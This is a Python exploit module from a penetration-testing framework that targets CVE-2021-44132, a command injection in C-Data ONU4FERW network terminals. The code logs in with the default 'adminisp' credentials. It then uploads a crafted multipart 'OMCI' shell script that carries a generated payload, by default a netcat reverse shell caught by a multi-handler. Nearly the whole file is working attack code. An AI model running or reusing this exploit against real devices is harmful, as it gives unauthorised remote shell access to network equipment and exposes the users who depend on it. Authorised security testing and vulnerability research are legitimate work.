#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 28/12/2022
import requests

from core.ModuleObtainer import obtainer
from core.Processor import processor
from core.generator.Generator import generator
from core.generator.Ofuscator import ofuscator
from utilities.Tools import tools
from requests import post
from utilities.Colors import color
from utilities.Messages import print_message

print_message.name_module = __file__

info = {
    'author': 'Samir Sanchez Garnica and Luis Jacome Valencia',
    'date': '19/11/2021',
    'rank': 'Excellent',
    'category': 'Exploit',
    'path': 'exploits/linux/misc/cdata/onu4ferw/os_command_injection_cve_2021_44132.py',
    'license': 'GPL-2.0',
    'description': 'This version is affected by the execution of remote code under the reading of a configuration file over the function called OMCI, which can be loaded by the default debug user e8c or adminisp.',
    'references': ['https://exploitwriter.io/2022/02/25/os-command-injection-in-c-data-onu4ferw-cve-2021-44132/','https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44132']
}

options = {
    'target': ['Yes', 'set target to attack', ''],
    'platform': ['Yes', 'set id target to attack', '0'],
    'payload': ['Yes', 'Set payload attack software', 'cmd/unix/reverse/nc_mknod_sh'],
    'username': ['Yes', 'Sets the username for authentication', 'adminisp'],
    'password': ['Yes', 'Sets the password for authentication', 'adminisp']
}

extra_info = {
    'cve': ['CVE-2021-44132'],
    'targets': ['GNU/Linux']
}

required = {
    'start_required': 'True',
    'check_required': 'False'
}


def authenticate(__username, __passwd, __target):
    __data_auth = "username={}&psd={}".format(__username, __passwd)
    __path_login = "http://{}/boaform/admin/formLogin".format(__target.split("//")[1].split('/')[0])
    print_message.execution_info("[+] Authenticating with user: {0} pwd: {1}".format(color.color("yellow", __username), color.color("yellow", __passwd)))

    __headers_auth = {
        'Host': __target.split("//")[1].split('/')[0],
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '{}'.format(str(len(__data_auth)))
    }

    __response_auth = requests.request("POST", __path_login, headers=__headers_auth, data=__data_auth)
    if 'bad password' in __response_auth.text:
        return False
    else:
        return True

def exploit():
    try:
        print_message.start_execution()

        __target = tools.http_or_https(obtainer.options['target'][2])
        __url = obtainer.options['target'][2] + '/boaform/formImportOMCIShell'
        __session = requests.Session()

        if __target['code'] == 200:

            if authenticate(obtainer.options['username'][2], obtainer.options['password'][2], obtainer.options['target'][2]):
                __platform = int(obtainer.options['platform'][2])

                if extra_info['targets'][__platform]:
                    __platform = extra_info['targets'][__platform]

                __payload_generate = generator.generator_payload(options_payload=obtainer.options_payload,
                                                                 options_exploit=obtainer.options,
                                                                 extra_info=extra_info)

                processor.multi_handler(payload_options=obtainer.options_payload,
                                        exploit_options=obtainer.options)
                __data = '-----------------------------358167974513189061271693647429\x0d\x0aContent-Disposition: form-data; name=\"binary\"; filename=\"osiris.sh\"\x0d\x0aContent-Type: application/x-sh\x0d\x0a\x0d\x0a#!/bin/sh\x0d\x0a'+__payload_generate['message']+'\x0d\x0a-----------------------------358167974513189061271693647429\x0d\x0aContent-Disposition: form-data; name=\"load\"\x0d\x0a\x0d\x0aImport\x0d\x0a-----------------------------358167974513189061271693647429--\x0d\x0a'

                __headers = {
                    'Host': obtainer.options['target'][2].split("//")[1].split('/')[0],
                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
                    'Accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Type': 'multipart/form-data; boundary=---------------------------358167974513189061271693647429',
                    'Content-Length': '{}'.format(str(len(__data))),
                    'Origin': obtainer.options['target'][2],
                    'Connection': 'close',
                    'Referer': obtainer.options['target'][2] + '/bd/vermod.asp',
                    'Upgrade-Insecure-Requests': '1',
                }

                try:
                    __response = requests.post(__url, headers=__headers, data=__data, verify=False)
                except Exception as e:
                    if 'BadStatusLine' in str(e):
                        print_message.execution_info("Getting shell successful...")
            else:
                print_message.execution_error("Authentication failed...")
                return False

        else:
            print_message.execution_error("The URL must be in the format http:// or https://")
            return False

    except Exception as Error:
        print(Error)

    print_message.end_execution()


def check():
    pass
